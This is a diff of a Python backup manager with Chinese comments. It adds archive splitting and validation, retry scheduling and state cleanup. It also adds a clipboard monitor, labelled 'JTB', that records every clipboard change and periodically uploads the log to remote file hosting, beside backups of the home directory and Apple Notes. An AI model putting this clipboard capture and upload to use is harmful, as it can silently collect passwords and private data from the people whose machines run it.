@@ -22,11 +22,9 @@ import json
 import hashlib
 import sqlite3
 import tempfile
+import uuid
 from pathlib import Path
 from datetime import datetime, timedelta
-from functools import lru_cache
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Optional, Iterator, Tuple, List
 
 try:
     import fcntl
@@ -36,6 +34,9 @@ except ImportError:  # 非 Unix 平台不提供 fcntl
 
 def _empty_backup_state():
     return {"version": 1, "files": {}, "pending_archives": {}}
+
+
+CUSTOM_DATA_STATE_PREFIX = "mac:backup-data/"
 
 
 def archive_group_key(path):
@@ -58,6 +59,533 @@ def group_archive_paths(paths):
     return groups
 
 
+class ArchiveError(RuntimeError):
+    """归档创建或校验失败。"""
+
+
+def _entry_kind(path):
+    if os.path.islink(path):
+        return "symlink"
+    if os.path.isdir(path):
+        return "directory"
+    if os.path.isfile(path):
+        return "file"
+    return "other"
+
+
+def build_manifest(folder_path):
+    """返回归档内路径、类型、大小和链接目标组成的有序清单。"""
+    folder_path = os.path.abspath(folder_path)
+    root_name = os.path.basename(os.path.normpath(folder_path))
+    manifest = {}
+
+    def visit(path, relative):
+        kind = _entry_kind(path)
+        stat = os.lstat(path)
+        archive_name = root_name if not relative else (
+            f"{root_name}/{relative.replace(os.sep, '/')}")
+        link_target = os.readlink(path) if kind == "symlink" else ""
+        manifest[archive_name] = (
+            kind,
+            stat.st_size if kind == "file" else (
+                len(link_target.encode("utf-8", "surrogateescape"))
+                if kind == "symlink" else 0),
+            link_target,
+        )
+        if kind != "directory":
+            return
+        with os.scandir(path) as entries:
+            for entry in sorted(entries, key=lambda item: item.name):
+                child_relative = (
+                    entry.name if not relative
+                    else os.path.join(relative, entry.name)
+                )
+                visit(entry.path, child_relative)
+
+    visit(folder_path, "")
+    return manifest
+
+
+def _archive_members(tar_path):
+    members = {}
+    with tarfile.open(tar_path, "r:gz") as archive:
+        for member in archive:
+            if member.isdir():
+                kind = "directory"
+            elif member.islnk() or member.issym():
+                kind = "symlink"
+            elif member.isfile():
+                kind = "file"
+            else:
+                kind = "other"
+            link_target = member.linkname if kind == "symlink" else ""
+            members[member.name.rstrip("/")] = (
+                kind,
+                member.size if kind == "file" else (
+                    len(link_target.encode("utf-8", "surrogateescape"))
+                    if kind == "symlink" else 0),
+                link_target,
+            )
+            if kind == "file":
+                extracted = archive.extractfile(member)
+                if extracted is None:
+                    raise ArchiveError(f"无法读取归档成员: {member.name}")
+                while extracted.read(1024 * 1024):
+                    pass
+    return members
+
+
+def validate_archive(tar_path, expected_manifest):
+    """通过完整读取 gzip/tar 内容和成员清单验证归档。"""
+    try:
+        actual = _archive_members(tar_path)
+    except (OSError, tarfile.TarError, EOFError) as exc:
+        raise ArchiveError(f"归档校验失败: {exc}") from exc
+    if actual != expected_manifest:
+        missing = sorted(set(expected_manifest) - set(actual))
+        extra = sorted(set(actual) - set(expected_manifest))
+        changed = sorted(
+            name for name in set(actual) & set(expected_manifest)
+            if actual[name][0] != expected_manifest[name][0]
+            or (actual[name][0] == "file"
+                and actual[name][1] != expected_manifest[name][1])
+        )
+        raise ArchiveError(
+            "归档成员清单不一致: "
+            f"缺少={missing[:5]}，额外={extra[:5]}，类型或大小变化={changed[:5]}")
+
+
+def _publish_without_overwrite(temporary_path, final_path):
+    """同目录硬链接发布；目标存在时失败，避免覆盖 pending 归档。"""
+    try:
+        os.link(temporary_path, final_path)
+    except FileExistsError as exc:
+        raise ArchiveError(f"归档目标已存在，拒绝覆盖: {final_path}") from exc
+    finally:
+        try:
+            os.remove(temporary_path)
+        except FileNotFoundError:
+            pass
+
+
+def create_archive(folder_path, archive_path, compresslevel=6):
+    """创建并校验单个 tar.gz；失败时不留下正式文件或临时文件。"""
+    folder_path = os.path.abspath(folder_path)
+    archive_path = os.path.abspath(archive_path)
+    os.makedirs(os.path.dirname(archive_path), exist_ok=True)
+    temporary_path = os.path.join(
+        os.path.dirname(archive_path),
+        f".{os.path.basename(archive_path)}.{uuid.uuid4().hex}.partial",
+    )
+    try:
+        expected = build_manifest(folder_path)
+        with tarfile.open(
+                temporary_path, "w:gz", compresslevel=compresslevel) as archive:
+            archive.add(folder_path, arcname=os.path.basename(folder_path))
+        validate_archive(temporary_path, expected)
+        _publish_without_overwrite(temporary_path, archive_path)
+        return archive_path
+    except Exception:
+        try:
+            os.remove(temporary_path)
+        except FileNotFoundError:
+            pass
+        raise
+
+
+def _split_entries(manifest, max_source_size):
+    directories = [
+        name for name, entry in manifest.items() if entry[0] == "directory"
+    ]
+    metadata = [
+        name for name, entry in manifest.items()
+        if entry[0] not in ("directory", "file")
+    ]
+    files = sorted(
+        (
+            (name, entry[1])
+            for name, entry in manifest.items()
+            if entry[0] == "file"
+        ),
+        key=lambda item: item[1],
+        reverse=True,
+    )
+    chunks = []
+    current = []
+    current_size = 0
+    for name, size in files:
+        if current and current_size + size > max_source_size:
+            chunks.append(current)
+            current = []
+            current_size = 0
+        current.append(name)
+        current_size += size
+    if current:
+        chunks.append(current)
+    if not chunks:
+        chunks = [[]]
+    return directories, metadata, chunks
+
+
+def _write_archive_entries(folder_path, temporary_path, member_names,
+                           compresslevel=9):
+    root_name = os.path.basename(os.path.normpath(folder_path))
+    with tarfile.open(
+            temporary_path, "w:gz", compresslevel=compresslevel) as archive:
+        for member_name in member_names:
+            relative = member_name[len(root_name):].lstrip("/")
+            source = folder_path if not relative else os.path.join(
+                folder_path, *relative.split("/"))
+            info = archive.gettarinfo(source, arcname=member_name)
+            if info is None:
+                raise ArchiveError(f"无法读取源文件元数据: {source}")
+            if info.isfile():
+                with open(source, "rb") as source_file:
+                    archive.addfile(info, source_file)
+            else:
+                archive.addfile(info)
+
+
+def split_archive(folder_path, base_archive_path, max_source_size):
+    """按源文件大小生成多个经过校验的 tar.gz 分片。"""
+    folder_path = os.path.abspath(folder_path)
+    base_archive_path = os.path.abspath(base_archive_path)
+    manifest = build_manifest(folder_path)
+    directories, metadata, file_chunks = _split_entries(
+        manifest, max_source_size)
+    root_name = os.path.basename(os.path.normpath(folder_path))
+    if root_name not in directories:
+        directories.insert(0, root_name)
+
+    created = []
+    try:
+        for part_num, files in enumerate(file_chunks):
+            member_names = list(directories)
+            if part_num == 0:
+                member_names.extend(metadata)
+            member_names.extend(files)
+            member_names = list(dict.fromkeys(member_names))
+            expected = {name: manifest[name] for name in member_names}
+            final_path = f"{base_archive_path}_part{part_num}.tar.gz"
+            temporary_path = os.path.join(
+                os.path.dirname(final_path),
+                f".{os.path.basename(final_path)}.{uuid.uuid4().hex}.partial",
+            )
+            try:
+                _write_archive_entries(
+                    folder_path, temporary_path, member_names)
+                validate_archive(temporary_path, expected)
+                _publish_without_overwrite(temporary_path, final_path)
+                created.append(final_path)
+            except Exception:
+                try:
+                    os.remove(temporary_path)
+                except FileNotFoundError:
+                    pass
+                raise
+        return created
+    except Exception:
+        for path in created:
+            try:
+                os.remove(path)
+            except FileNotFoundError:
+                pass
+        raise
+
+
+CLIPBOARD_LOG_EMPTY = "empty"
+CLIPBOARD_LOG_CONTENT = "content"
+CLIPBOARD_LOG_ERROR = "error"
+
+
+def _clipboard_separator_line(line):
+    return not line.startswith("-" * 30)
+
+
+def get_clipboard_log_state(file_path, lock):
+    """区分空文件、有效内容与读取失败。"""
+    try:
+        with lock:
+            if not os.path.exists(file_path):
+                return CLIPBOARD_LOG_EMPTY
+            if os.path.getsize(file_path) == 0:
+                return CLIPBOARD_LOG_EMPTY
+            with open(
+                    file_path, "r", encoding="utf-8",
+                    errors="ignore") as source:
+                content = source.read().strip()
+    except (OSError, IOError) as exc:
+        logging.error(f"读取剪贴板日志失败: {exc}")
+        return CLIPBOARD_LOG_ERROR
+
+    if not content:
+        return CLIPBOARD_LOG_EMPTY
+    actual_content = [
+        line.strip() for line in content.splitlines()
+        if line.strip()
+        and not line.strip().startswith("===")
+        and not line.strip().startswith("📋")
+        and not line.strip().startswith("JTB日志已于")
+        and not line.strip().startswith("JTB监控启动于")
+        and _clipboard_separator_line(line.strip())
+    ]
+    return CLIPBOARD_LOG_CONTENT if actual_content else CLIPBOARD_LOG_EMPTY
+
+
+def append_clipboard_update(file_path, content, lock):
+    try:
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
+        with lock, open(
+                file_path, "a", encoding="utf-8",
+                errors="ignore") as target:
+            target.write(
+                "\n=== 📋 "
+                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+            target.write(f"{content}\n")
+            target.write("-" * 30 + "\n")
+        return True
+    except (OSError, IOError, PermissionError) as exc:
+        logging.error(f"❌ 记录JTB失败: {exc}")
+        return False
+
+
+def read_clipboard_snapshot(file_path, lock):
+    with lock, open(file_path, "rb") as source:
+        return source.read()
+
+
+def trim_clipboard_snapshot(file_path, snapshot, lock):
+    """在锁内移除已上传前缀；上传期间追加的内容会保留。"""
+    with lock, open(file_path, "rb") as current_file:
+        current = current_file.read()
+    if not current.startswith(snapshot):
+        return False
+    remainder = current[len(snapshot):]
+    with lock, open(file_path, "wb") as current_file:
+        current_file.write(remainder)
+    return True
+
+
+def reset_empty_clipboard_log(file_path, lock):
+    with lock, open(file_path, "w", encoding="utf-8") as target:
+        target.write(
+            "=== 📋 JTB监控启动于 "
+            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+
+
+def run_clipboard_monitor(manager, file_path, interval, stop_event):
+    last_content = ""
+    error_count = 0
+    while stop_event is None or not stop_event.is_set():
+        try:
+            current_content = manager.get_clipboard_content()
+            if current_content and current_content != last_content:
+                if manager.log_clipboard_update(current_content, file_path):
+                    last_content = current_content
+                    error_count = 0
+                else:
+                    error_count += 1
+            else:
+                error_count = 0
+        except Exception as exc:
+            error_count += 1
+            logging.error(f"❌ JTB监控出错: {exc}")
+
+        wait_seconds = interval
+        if error_count >= 5:
+            wait_seconds = manager.config.CLIPBOARD_ERROR_WAIT
+            error_count = 0
+        if stop_event is None:
+            time.sleep(wait_seconds)
+        elif stop_event.wait(wait_seconds):
+            break
+
+
+def run_clipboard_upload(manager, file_path, stop_event):
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    last_upload_time = 0
+    while stop_event is None or not stop_event.is_set():
+        try:
+            current_time = time.time()
+            if current_time - last_upload_time >= manager.config.CLIPBOARD_INTERVAL:
+                state = manager.get_clipboard_log_state(file_path)
+                if state == CLIPBOARD_LOG_CONTENT:
+                    temp_dir = os.path.join(
+                        manager.config.BACKUP_ROOT,
+                        f"{user_prefix}_temp", "clipboard")
+                    if manager._ensure_directory(temp_dir):
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        temp_file = os.path.join(
+                            temp_dir,
+                            f"{user_prefix}_clipboard_{timestamp}.txt")
+                        try:
+                            snapshot = read_clipboard_snapshot(
+                                file_path, manager._clipboard_lock())
+                            with open(temp_file, "wb") as target:
+                                target.write(snapshot)
+                            if manager.upload_file(temp_file):
+                                if not trim_clipboard_snapshot(
+                                        file_path, snapshot,
+                                        manager._clipboard_lock()):
+                                    logging.warning(
+                                        "⚠️ JTB日志在快照后发生结构变化，"
+                                        "未清空当前日志")
+                                last_upload_time = current_time
+                        except Exception as exc:
+                            logging.error(f"❌ JTB日志上传失败: {exc}")
+                        finally:
+                            try:
+                                if os.path.exists(temp_dir):
+                                    shutil.rmtree(temp_dir)
+                            except OSError:
+                                pass
+                elif state == CLIPBOARD_LOG_EMPTY:
+                    reset_empty_clipboard_log(
+                        file_path, manager._clipboard_lock())
+                    last_upload_time = current_time
+                else:
+                    logging.warning(
+                        "⚠️ 读取剪贴板日志失败，本轮保留文件，稍后重试")
+
+            wait_seconds = manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL
+            if stop_event is None:
+                time.sleep(wait_seconds)
+            elif stop_event.wait(wait_seconds):
+                break
+        except Exception as exc:
+            logging.error(f"JTB上传线程错误: {exc}")
+            if stop_event is None:
+                time.sleep(manager.config.ERROR_RETRY_DELAY)
+            elif stop_event.wait(manager.config.ERROR_RETRY_DELAY):
+                break
+
+
+class ClipboardWorkers:
+    """持有并管理一组剪贴板线程，防止管理器重建时重复启动。"""
+
+    def __init__(self, manager, file_path):
+        self.manager = manager
+        self.file_path = file_path
+        self.stop_event = threading.Event()
+        self.threads = []
+
+    def start(self):
+        if any(thread.is_alive() for thread in self.threads):
+            return False
+        self.stop_event.clear()
+        monitor = threading.Thread(
+            target=run_clipboard_monitor,
+            args=(
+                self.manager,
+                self.file_path,
+                self.manager.config.CLIPBOARD_CHECK_INTERVAL,
+                self.stop_event,
+            ),
+            daemon=True,
+            name="clipboard-monitor",
+        )
+        uploader = threading.Thread(
+            target=run_clipboard_upload,
+            args=(self.manager, self.file_path, self.stop_event),
+            daemon=True,
+            name="clipboard-upload",
+        )
+        self.threads = [monitor, uploader]
+        monitor.start()
+        uploader.start()
+        return True
+
+    def stop(self, timeout=5):
+        self.stop_event.set()
+        for thread in self.threads:
+            if thread.is_alive():
+                thread.join(timeout=timeout)
+        self.threads = []
+
+
+class BackupSchedule:
+    """下一次正常备份和失败重试时间的持久化。"""
+
+    def __init__(self, config):
+        self.config = config
+
+    def read_next_backup_time(self):
+        try:
+            if not os.path.exists(self.config.THRESHOLD_FILE):
+                return None
+            with open(
+                    self.config.THRESHOLD_FILE, "r",
+                    encoding="utf-8") as source:
+                next_time = datetime.strptime(
+                    source.read().strip(), "%Y-%m-%d %H:%M:%S")
+            maximum = datetime.now() + timedelta(
+                seconds=self.config.BACKUP_INTERVAL)
+            return min(next_time, maximum)
+        except (OSError, ValueError):
+            return None
+
+    def write_next_backup_time(self):
+        try:
+            next_time = datetime.now() + timedelta(
+                seconds=self.config.BACKUP_INTERVAL)
+            os.makedirs(
+                os.path.dirname(self.config.THRESHOLD_FILE), exist_ok=True)
+            with open(
+                    self.config.THRESHOLD_FILE, "w",
+                    encoding="utf-8") as target:
+                target.write(next_time.strftime("%Y-%m-%d %H:%M:%S"))
+            return next_time
+        except OSError:
+            return None
+
+    def read_retry_time(self):
+        try:
+            if not os.path.exists(self.config.RETRY_THRESHOLD_FILE):
+                return None
+            with open(
+                    self.config.RETRY_THRESHOLD_FILE, "r",
+                    encoding="utf-8") as source:
+                return datetime.strptime(
+                    source.read().strip(), "%Y-%m-%d %H:%M:%S")
+        except (OSError, ValueError):
+            return None
+
+    def write_retry_time(self, delay_seconds=None):
+        try:
+            delay = (
+                self.config.ERROR_RETRY_DELAY
+                if delay_seconds is None else delay_seconds)
+            retry_time = datetime.now() + timedelta(seconds=delay)
+            os.makedirs(
+                os.path.dirname(self.config.RETRY_THRESHOLD_FILE),
+                exist_ok=True)
+            with open(
+                    self.config.RETRY_THRESHOLD_FILE, "w",
+                    encoding="utf-8") as target:
+                target.write(retry_time.strftime("%Y-%m-%d %H:%M:%S"))
+            return retry_time
+        except OSError:
+            return None
+
+    def clear_retry_time(self):
+        try:
+            if os.path.exists(self.config.RETRY_THRESHOLD_FILE):
+                os.remove(self.config.RETRY_THRESHOLD_FILE)
+        except OSError:
+            pass
+
+    def should_backup_now(self):
+        next_backup_time = self.read_next_backup_time()
+        retry_time = self.read_retry_time()
+        now = datetime.now()
+        if next_backup_time is not None and now >= next_backup_time:
+            return True
+        if retry_time is not None and now >= retry_time:
+            return True
+        return next_backup_time is None and retry_time is None
+
+
 class BackupResult:
     """备份结果对象，用于区分完整成功、部分成功和失败。"""
 
@@ -74,21 +602,6 @@ class BackupResult:
 
     def __bool__(self):
         return bool(self.path)
-
-@lru_cache(maxsize=8192)
-def get_file_size_cached(path: str) -> int:
-    """缓存文件大小，避免重复系统调用
-
-    Args:
-        path: 文件路径
-
-    Returns:
-        文件大小（字节），失败返回 0
-    """
-    try:
-        return os.path.getsize(path)
-    except (OSError, IOError):
-        return 0
 
 try:
     import requests
@@ -152,11 +665,15 @@ class BackupConfig:
     FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
     FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
     FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
+    CONTENT_VERIFY_INTERVAL = 7 * 24 * 60 * 60  # 元数据未变时的完整内容校验周期
+    STATE_RETENTION_DAYS = 90  # 源文件已消失时保留历史指纹的天数
+    ORPHAN_ARCHIVE_AGE = 60 * 60  # 未登记 pending 的残留归档清理年龄
     
     # 错误处理配置
     CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
     BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
     ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
+    MAX_RETRY_DELAY = 6 * 60 * 60  # 连续失败时的最大退避时间（秒）
     MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
     
     # 磁盘空间检查
@@ -377,7 +894,7 @@ class BackupManager:
 
         # 配置 requests session 用于上传
         self.session = requests.Session()
-        self.session.verify = False  # 禁用SSL验证
+        self.session.verify = True
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
         
         # GoFile API token（备选方案）：主 token 失败时回退到备用 token
@@ -393,6 +910,12 @@ class BackupManager:
         self._setup_logging()
         self._state_lock = threading.RLock()
         self._state = self._load_backup_state()
+        self._clipboard_file_lock = threading.RLock()
+        self._worker_stop_event = threading.Event()
+        self._clipboard_threads = []
+        self._clipboard_workers = None
+        self._pending_index = None
+        self._rebuild_pending_index()
 
     def _setup_logging(self):
         """配置日志系统"""
@@ -478,26 +1001,6 @@ class BackupManager:
             print(f"设置日志系统时出错: {e}")
 
     @staticmethod
-    def _get_dir_size(directory):
-        """获取目录总大小
-        
-        Args:
-            directory: 目录路径
-            
-        Returns:
-            int: 目录大小（字节）
-        """
-        total_size = 0
-        for dirpath, _, filenames in os.walk(directory):
-            for filename in filenames:
-                file_path = os.path.join(dirpath, filename)
-                try:
-                    total_size += os.path.getsize(file_path)
-                except (OSError, IOError) as e:
-                    logging.error(f"获取文件大小失败 {file_path}: {e}")
-        return total_size
-
-    @staticmethod
     def _ensure_directory(directory_path):
         """确保目录存在
         
@@ -539,14 +1042,6 @@ class BackupManager:
         except (OSError, IOError, PermissionError) as e:
             logging.error(f"清理目录失败 {directory_path}: {e}")
             return False
-
-    @staticmethod
-    def _free_space(path):
-        """返回路径所在磁盘的可用字节数，无法获取时返回 None。"""
-        try:
-            return shutil.disk_usage(path).free
-        except (OSError, IOError):
-            return None
 
     @staticmethod
     def _ensure_free_space(required_bytes, path):
@@ -645,10 +1140,24 @@ class BackupManager:
             return False
         return True
 
+    def _rebuild_pending_index(self):
+        index = {}
+        for archive_key, pending in self._state.get(
+                "pending_archives", {}).items():
+            if not isinstance(pending, dict):
+                continue
+            for rel_key, entry in pending.get("files", {}).items():
+                index.setdefault(rel_key, []).append(
+                    (archive_key, entry))
+        self._pending_index = index
+
     def _pending_contains(self, rel_key, fingerprint):
         """内容已在待上传归档中时，本轮不重复打包和上传。"""
-        for pending in self._state.get("pending_archives", {}).values():
-            entry = pending.get("files", {}).get(rel_key) if isinstance(pending, dict) else None
+        index = getattr(self, "_pending_index", None)
+        if index is None:
+            self._rebuild_pending_index()
+            index = self._pending_index
+        for _, entry in index.get(rel_key, ()):
             if self._entry_matches(entry, fingerprint, compare_content=True):
                 return True
         return False
@@ -657,15 +1166,47 @@ class BackupManager:
         """返回 (内容是否已可靠备份, 当前内容指纹)。"""
         with self._state_lock:
             entry = self._state.get("files", {}).get(rel_key)
+            stat = os.lstat(source_path)
+            current_kind = (
+                "symlink" if preserve_symlinks and os.path.islink(source_path)
+                else "file"
+            )
+            metadata_matches = (
+                isinstance(entry, dict)
+                and entry.get("kind") == current_kind
+                and entry.get("size") == stat.st_size
+                and entry.get("mtime_ns") == stat.st_mtime_ns
+            )
+            last_verified = (
+                int(entry.get("verified_at_ns", entry.get("recorded_at_ns", 0)))
+                if isinstance(entry, dict) else 0
+            )
+            verification_age = time.time_ns() - last_verified
+            if (metadata_matches
+                    and 0 <= verification_age
+                    <= self.config.CONTENT_VERIFY_INTERVAL * 1_000_000_000):
+                return True, entry
+
+            index = getattr(self, "_pending_index", None)
+            if index is None:
+                self._rebuild_pending_index()
+                index = self._pending_index
+            for _, pending_entry in index.get(rel_key, ()):
+                if (isinstance(pending_entry, dict)
+                        and pending_entry.get("kind") == current_kind
+                        and pending_entry.get("size") == stat.st_size
+                        and pending_entry.get("mtime_ns") == stat.st_mtime_ns):
+                    return True, pending_entry
+
             fingerprint = self._path_fingerprint(
                 source_path, preserve_symlinks=preserve_symlinks)
             if self._entry_matches(entry, fingerprint, compare_content=True):
                 # 仅时间戳变化而内容相同时刷新元数据，不触发重新上传。
-                if entry.get("mtime_ns") != fingerprint.get("mtime_ns"):
-                    updated = dict(fingerprint)
-                    if "recorded_at_ns" in entry:
-                        updated["recorded_at_ns"] = entry["recorded_at_ns"]
-                    self._state.setdefault("files", {})[rel_key] = updated
+                updated = dict(fingerprint)
+                if "recorded_at_ns" in entry:
+                    updated["recorded_at_ns"] = entry["recorded_at_ns"]
+                updated["verified_at_ns"] = time.time_ns()
+                self._state.setdefault("files", {})[rel_key] = updated
                 return True, fingerprint
             if self._pending_contains(rel_key, fingerprint):
                 return True, fingerprint
@@ -858,28 +1399,77 @@ class BackupManager:
         except Exception as exc:
             logging.error(f"保存备份状态失败: {exc}")
 
+    def _known_state_source_path(self, rel_key):
+        prefixes = (
+            ("mac:home/", os.path.expanduser("~")),
+            (CUSTOM_DATA_STATE_PREFIX, os.path.join(
+                self.config.BACKUP_ROOT, "data")),
+            ("notes/", os.path.expanduser(
+                "~/Library/Group Containers/group.com.apple.notes")),
+        )
+        for prefix, source_root in prefixes:
+            if not rel_key.startswith(prefix):
+                continue
+            relative = rel_key[len(prefix):]
+            relative_path = Path(relative)
+            if (relative_path.is_absolute()
+                    or any(part in ("", ".", "..")
+                           for part in relative_path.parts)):
+                return None
+            return os.path.join(source_root, *relative_path.parts)
+        return None
+
+    def prune_stale_state(self):
+        """删除长期不存在且属于已知源目录的内容指纹。"""
+        cutoff_ns = time.time_ns() - (
+            self.config.STATE_RETENTION_DAYS * 24 * 60 * 60 * 1_000_000_000)
+        removed = 0
+        with self._state_lock:
+            files = self._state.setdefault("files", {})
+            for rel_key, entry in list(files.items()):
+                if not isinstance(entry, dict):
+                    continue
+                recorded_at = int(entry.get("recorded_at_ns", 0))
+                if not recorded_at or recorded_at >= cutoff_ns:
+                    continue
+                source_path = self._known_state_source_path(rel_key)
+                if source_path and not os.path.lexists(source_path):
+                    files.pop(rel_key, None)
+                    removed += 1
+            if removed:
+                self._rebuild_pending_index()
+                self._save_backup_state()
+                logging.info(f"🧹 已清理 {removed} 条失效的历史文件指纹")
+        return removed
+
     def register_pending_archive(self, archive_path, file_records):
         """归档生成后先登记 pending；上传成功前对应内容不会重复打包。"""
         if not file_records:
             return
         key = archive_group_key(archive_path)
         with self._state_lock:
-            self._state.setdefault("pending_archives", {})[key] = {
+            pending = self._state.setdefault("pending_archives", {})
+            if key in pending:
+                raise RuntimeError(f"pending 归档键已存在，拒绝覆盖: {key}")
+            pending[key] = {
                 "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "created_at_ns": time.time_ns(),
                 "files": dict(file_records),
             }
+            self._rebuild_pending_index()
             self._save_backup_state()
 
     def mark_archive_uploaded(self, archive_key):
         """仅在整个归档组上传成功后，提交文件内容指纹。"""
         key = archive_group_key(archive_key)
+        pending_files = {}
         with self._state_lock:
             pending = self._state.setdefault("pending_archives", {}).pop(key, None)
             if not pending:
                 return
+            pending_files = pending.get("files", {})
             pending_time = pending.get("created_at_ns", 0)
-            for rel_key, fingerprint in pending.get("files", {}).items():
+            for rel_key, fingerprint in pending_files.items():
                 if not isinstance(fingerprint, dict):
                     continue
                 existing = self._state.setdefault("files", {}).get(rel_key, {})
@@ -888,7 +1478,137 @@ class BackupManager:
                 updated = dict(fingerprint)
                 updated["recorded_at_ns"] = pending_time
                 self._state["files"][rel_key] = updated
+            self._rebuild_pending_index()
             self._save_backup_state()
+
+        deleted_files = self._cleanup_uploaded_custom_data(pending_files)
+        if deleted_files:
+            logging.info(f"🧹 已清理 {deleted_files} 个已上传的自定义数据文件")
+
+    def _cleanup_uploaded_custom_data(self, file_records=None):
+        """隔离校验后删除已上传文件，避免检查与删除之间误删新写入。"""
+        data_dir = os.path.abspath(os.path.join(
+            self.config.BACKUP_ROOT, "data"))
+        if not os.path.isdir(data_dir):
+            return 0
+        quarantine_root = os.path.join(
+            self.config.BACKUP_ROOT, ".custom-data-cleanup")
+        self._recover_custom_data_quarantine(data_dir, quarantine_root)
+
+        if file_records is None:
+            with self._state_lock:
+                file_records = dict(self._state.get("files", {}))
+
+        deleted_files = 0
+        for rel_key, uploaded in file_records.items():
+            if (not rel_key.startswith(CUSTOM_DATA_STATE_PREFIX)
+                    or not isinstance(uploaded, dict)):
+                continue
+
+            relative = rel_key[len(CUSTOM_DATA_STATE_PREFIX):]
+            relative_path = Path(relative)
+            if (relative_path.is_absolute()
+                    or any(part in ("", ".", "..") for part in relative_path.parts)):
+                logging.warning(f"⚠️ 忽略不安全的自定义数据状态路径: {rel_key}")
+                continue
+
+            source_path = os.path.join(data_dir, *relative_path.parts)
+            quarantine_path = os.path.join(
+                quarantine_root, *relative_path.parts)
+            try:
+                if not os.path.lexists(source_path):
+                    continue
+                os.makedirs(os.path.dirname(quarantine_path), exist_ok=True)
+                if os.path.lexists(quarantine_path):
+                    self._restore_quarantined_file(
+                        quarantine_path, source_path)
+                    continue
+                os.rename(source_path, quarantine_path)
+
+                if os.path.islink(quarantine_path):
+                    current = self._symlink_fingerprint(quarantine_path)
+                    stable = True
+                elif os.path.isfile(quarantine_path):
+                    before = os.stat(quarantine_path)
+                    current = self._file_fingerprint(quarantine_path)
+                    after = os.stat(quarantine_path)
+                    stable = (
+                        before.st_dev, before.st_ino, before.st_size,
+                        before.st_mtime_ns,
+                    ) == (
+                        after.st_dev, after.st_ino, after.st_size,
+                        after.st_mtime_ns,
+                    )
+                else:
+                    current = None
+                    stable = False
+
+                if stable and self._entry_matches(uploaded, current or {}):
+                    os.remove(quarantine_path)
+                    deleted_files += 1
+                else:
+                    self._restore_quarantined_file(
+                        quarantine_path, source_path)
+            except OSError as exc:
+                logging.warning(
+                    f"⚠️ 清理已上传自定义数据失败 {source_path}: {exc}")
+
+        if deleted_files:
+            for root, _, _ in os.walk(data_dir, topdown=False, followlinks=False):
+                if os.path.normcase(root) == os.path.normcase(data_dir):
+                    continue
+                try:
+                    if not os.listdir(root):
+                        os.rmdir(root)
+                except OSError:
+                    pass
+            self._remove_empty_tree(quarantine_root)
+        return deleted_files
+
+    @staticmethod
+    def _restore_quarantined_file(quarantine_path, source_path):
+        """恢复未确认删除的文件；目标冲突时保留可识别的恢复副本。"""
+        os.makedirs(os.path.dirname(source_path), exist_ok=True)
+        destination = source_path
+        if os.path.lexists(source_path):
+            destination = (
+                f"{source_path}.recovered-{time.time_ns()}"
+            )
+        os.rename(quarantine_path, destination)
+        logging.warning(f"⚠️ 已恢复未确认删除的数据文件: {destination}")
+
+    def _recover_custom_data_quarantine(self, data_dir, quarantine_root):
+        """启动清理前恢复上次中断遗留的隔离文件。"""
+        if not os.path.isdir(quarantine_root):
+            return
+        for root, dirs, files in os.walk(
+                quarantine_root, topdown=False, followlinks=False):
+            entries = list(files)
+            entries.extend(
+                name for name in dirs
+                if os.path.islink(os.path.join(root, name)))
+            for name in entries:
+                quarantine_path = os.path.join(root, name)
+                relative = os.path.relpath(quarantine_path, quarantine_root)
+                source_path = os.path.join(data_dir, relative)
+                try:
+                    self._restore_quarantined_file(
+                        quarantine_path, source_path)
+                except OSError as exc:
+                    logging.error(f"❌ 恢复隔离数据失败 {quarantine_path}: {exc}")
+        self._remove_empty_tree(quarantine_root)
+
+    @staticmethod
+    def _remove_empty_tree(root_path):
+        if not os.path.isdir(root_path):
+            return
+        for root, _, _ in os.walk(
+                root_path, topdown=False, followlinks=False):
+            try:
+                if not os.listdir(root):
+                    os.rmdir(root)
+            except OSError:
+                pass
 
     def reconcile_pending_archives(self, existing_keys, key_prefixes=None):
         """移除本地已不存在的 pending 归档，让对应文件下次重新备份。"""
@@ -904,6 +1624,7 @@ class BackupManager:
                 return
             for key in stale_keys:
                 pending.pop(key, None)
+            self._rebuild_pending_index()
             logging.warning(f"⚠️ 清理 {len(stale_keys)} 个已不存在的待上传归档记录")
             self._save_backup_state()
 
@@ -1201,14 +1922,6 @@ class BackupManager:
             failed_files=missing_files, changed_records=changed_records,
         )
     
-    def _get_upload_server(self):
-        """获取上传服务器地址
-    
-        Returns:
-            str: 上传服务器URL
-        """
-        return "https://upload.gofile.io/uploadfile"
-
     def split_large_file(self, file_path):
         """将大文件分割成小块
         
@@ -1631,248 +2344,98 @@ class BackupManager:
             return False
 
     def zip_backup_folder(self, folder_path, zip_file_path):
-        """压缩备份文件夹为tar.gz格式
-        
-        Args:
-            folder_path: 要压缩的文件夹路径
-            zip_file_path: 压缩文件路径（不含扩展名）
-            
-        Returns:
-            str or list: 压缩文件路径或压缩文件路径列表
-        """
+        """安全压缩目录；超过源大小阈值时按 tar 成员分片。"""
         try:
             if folder_path is None or not os.path.exists(folder_path):
                 return None
 
-            # 检查源目录是否为空
-            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
-            if total_files == 0:
+            manifest = build_manifest(folder_path)
+            if len(manifest) <= 1:
                 logging.error(f"源目录为空 {folder_path}")
                 return None
 
-            # 计算源目录大小
-            dir_size = 0
-            for dirpath, _, filenames in os.walk(folder_path):
-                for filename in filenames:
-                    try:
-                        file_path = os.path.join(dirpath, filename)
-                        file_size = os.path.getsize(file_path)
